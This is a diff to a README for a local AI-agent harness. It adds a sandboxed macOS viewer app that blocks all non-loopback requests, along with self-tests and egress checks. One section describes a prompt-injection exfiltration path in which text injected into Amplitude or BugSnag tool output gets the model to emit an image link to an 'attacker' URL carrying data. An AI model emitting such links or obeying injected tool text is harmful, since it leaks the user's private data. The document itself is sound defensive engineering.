@@ -26,6 +26,8 @@ control key from another org stored normally.
 | `src/zdr-harness/bin/zdr-harness` | Wrapper: preflight checks + isolated environment |
 | `src/launchd/com.taylor.zdr-harness.plist` | Keeps `zdr-harness serve` running |
 | `src/mcps/zdr-ask-mcp` + `src/mcps/zdr-ask/index.mjs` | Zero-dependency MCP bridge for Claude Code / Codex |
+| `src/zdr-harness/app/` + `build_app.py` | **ZDR Harness.app**: native viewer for the web UI (see [App](#app)) |
+| `data/zdr-harness/ZDR Harness.app` (not in git) | Build output; the installed copy is `~/Applications/ZDR Harness.app` |
 | `~/.zdr-harness/.env` (600, not in git) | `KICKOFF_OPENAI_ZDR_API_KEY`, `ZDR_HARNESS_PASSWORD` |
 | `~/.zdr-harness/opt/` | Pinned OpenCode install (`opencode-ai@1.18.31`) |
 | `~/.zdr-harness/xdg/data/opencode/` | Sessions DB, MCP OAuth tokens, logs (**holds raw tool output**) |
@@ -85,10 +87,92 @@ zdr-harness status     # health, MCP connection state, web UI URL
 zdr-harness attach     # TUI on the running server
 zdr-harness logs
 zdr-harness restart
+zdr-harness app                  # build if stale, install, open ZDR Harness.app
+zdr-harness prune --dry-run      # sessions not updated in 30 days
+zdr-harness prune --days 14      # delete sessions not updated in 14 days
 ```
 
-Web UI: <http://127.0.0.1:4096> (user `opencode`, password from 1Password).
+Read and drive chats in **ZDR Harness.app**, not a browser tab (see [App](#app)).
 (`zdr-harness` = `~/dotfiles/src/zdr-harness/bin/zdr-harness`.)
+
+## App
+
+`~/Applications/ZDR Harness.app` (bundle id `com.taylor.zdr-harness.app`) is a
+small Swift app (AppKit + WebKit, no dependencies, ad-hoc signed) that shows the
+server's own embedded web UI in a `WKWebView`. It exists because a browser tab
+is not safe for this data.
+
+**Why not a browser tab.** The UI's CSP is `img-src 'self' data: https: blob:;
+connect-src *`. A model answer containing `![](https://attacker/?q=<data>)`
+makes a browser fetch that URL, and Amplitude or BugSnag content can carry
+injected text asking for exactly that. The agent's answer rule refuses to emit
+image links (tested 2026-09-17), but a prompt is not a control.
+**Why not OpenCode Desktop.** It ships Sentry and starts its own server.
+
+What the app does:
+
+- **Blocks every request that is not `http://127.0.0.1:4096/`.** A
+  `WKContentRuleList` (block `.*`, then `ignore-previous-rules` for
+  `^http://127\.0\.0\.1:4096/`) is installed before the first load. It covers
+  images (including `https:`), `fetch`, CSS, fonts, beacons and WebSockets. If
+  it fails to compile, the app shows an error and never loads the UI.
+- **Terminal panel disabled.** OpenCode's PTY panel uses `ws://`, which the rule
+  list blocks. A terminal there would be a shell holding the ZDR key.
+- **Second layer**, for what a rule list cannot see: a document-start script
+  turns DNS prefetch off and removes `RTCPeerConnection`.
+- **Navigation lock.** Only the harness origin loads in the window. Any other
+  link or popup is cancelled and shows its full URL with "Open in browser" /
+  "Cancel". Downloads, file uploads, camera and microphone are denied.
+- **Signs in without a prompt.** Reads only `ZDR_HARNESS_PASSWORD` from
+  `~/.zdr-harness/.env` at launch and keeps it in memory. It answers Basic
+  challenges only from `127.0.0.1:4096`, once; every other challenge is
+  cancelled.
+- **Status and service controls.** Title-bar status (`Healthy · amplitude ✓ ·
+  bugsnag ✓`) from `/global/health` and `/mcp` every 30 s and on focus. The
+  Harness menu has Restart Service (`launchctl kickstart -k`, or `bootstrap` if
+  booted out), Open Logs Folder, Open README and Copy Web URL. If the service is
+  down the window shows Restart Service / Retry and reloads once healthy. An MCP
+  server in `needs_auth`/`failed` gets an alert with the re-auth command.
+- **No leftovers.** HTTP caches are cleared at launch and quit. localStorage
+  keeps UI prefs, drafts and the project list under
+  `~/Library/WebKit/com.taylor.zdr-harness.app`. The web inspector is off unless
+  launched with `--debug`.
+
+Log: `~/.zdr-harness/logs/app.log` (rotated at 1 MB): launches, rule-list
+compile, blocked navigations (host and path only), health changes.
+
+**Not covered.** The status dot reflects `/mcp`, which says `connected` even
+when a server's upstream token has expired (BugSnag answers `401 Bad
+Credentials` inside tool results); re-auth fixes it. The rule list governs this
+app only: anyone with the password can still use a browser or the API. Clipboard
+contents and anything opened with "Open in browser" leave the app's control.
+
+**First run.** OpenCode 1.18.31 always uses its new layout. Home (`/`) lists
+sessions only for projects the UI knows, so once: **Add project → type
+`/Users/taylor/.zdr-harness/work` → pick it**. The UI remembers it. Session links
+look like `/<base64url of the dir>/session/<id>`; open one directly with
+`open -a "ZDR Harness" --args --session <id>`.
+
+```sh
+zdr-harness app                  # build if stale, install to ~/Applications, open
+zdr-harness app-build --force    # rebuild and install without opening
+A="$HOME/Applications/ZDR Harness.app/Contents/MacOS/ZDRHarness"
+"$A" --self-test                 # prints one JSON object, exit 0 only if all pass
+"$A" --self-test --canary-port 19471 --snapshot-dir /tmp/zdr-shots
+"$A" --self-test-recovery        # with the service booted out: placeholder, restart, reload
+"$A" --expect-env-error --env-file /nonexistent
+```
+
+`--self-test` runs the real window code off-screen and checks: rule list
+compiled; home rendered with sessions listed; in-page `fetch('/session')` 200
+(the Basic credential carries over); `EventSource('/event')` gets
+`server.connected`; `fetch`, `http:` and `https:` images and a WebSocket to a
+loopback canary on another port are blocked; foreign auth challenges are
+cancelled; the second layer is active. A throwaway web view with no rules must
+reach its own canary (positive control), so "zero requests" means something.
+With `--canary-port N` blocking is tested against your listener, whose access
+log must stay empty; with `--session <id>` it also puts Markdown-style images
+into the rendered answer.
 
 ## Setup from scratch
 
@@ -154,7 +238,8 @@ Responses WebSocket / `previous_response_id` path), then:
 
 ## Verification
 
-Run all of these after setup and after any upgrade or config change.
+Run all of these after setup and after any upgrade or change to the wrapper,
+config or app.
 
 1. **Key isolation.** `ps -Eww -p "$(pgrep -f 'opencode.exe serve')" | tr ' ' '\n' | grep -c _API_KEY=` → `1`,
    and its SHA-256 prefix matches the ZDR key in 1Password, not `launchctl getenv OPENAI_API_KEY`.
@@ -170,11 +255,26 @@ Run all of these after setup and after any upgrade or config change.
 5. **ZDR probe.** A Responses call with `store: true` using the harness key must
    return `store: false`, and fetching the response ID must return 404.
 6. **End to end.** `zdr_ask` an aggregate question from Claude Code, ask a
-   follow-up with the same `session_id`, and open the session in the web UI.
+   follow-up with the same `session_id`, and open the session in the app.
+7. **App build.** `zdr-harness app-build --force`, then
+   `codesign --verify --deep --strict ~/Applications/ZDR\ Harness.app`, and grep
+   the bundle (including `strings` of the binary) for the first 16 characters of
+   the password and 24 of the key → 0 hits.
+8. **App self-test.** Start a loopback listener that logs every connection on a
+   spare port, run `--self-test --canary-port <port>` and
+   `--self-test --canary-port <port> --session <id>` → `allPass` and an empty
+   listener log.
+9. **App egress.** With the app open on a session while a prompt streams, sample
+   `lsof -nP -iTCP -a -p` for `ZDRHarness` and its `com.apple.WebKit.*`
+   processes (the ones holding `com.taylor.zdr-harness.app` files) → only
+   `127.0.0.1:4096` (plus the self-test's own loopback canary if one is running).
+10. **App failure states.** `launchctl bootout gui/$(id -u)/com.taylor.zdr-harness`,
+    run `--self-test-recovery` → `allPass`, then `zdr-harness status` healthy.
 
 ## Data retention
 
 `~/.zdr-harness/xdg/data/opencode/opencode.db` and `log/` keep full sessions,
 including raw Amplitude and BugSnag tool output, on this Mac. Delete old
-sessions with `DELETE /session/<id>` (or remove the DB while the service is
-stopped).
+sessions with `zdr-harness prune [--days N]` (dry-run first with `--dry-run`),
+`DELETE /session/<id>`, or remove the DB while the service is stopped. There is
+no scheduled prune.
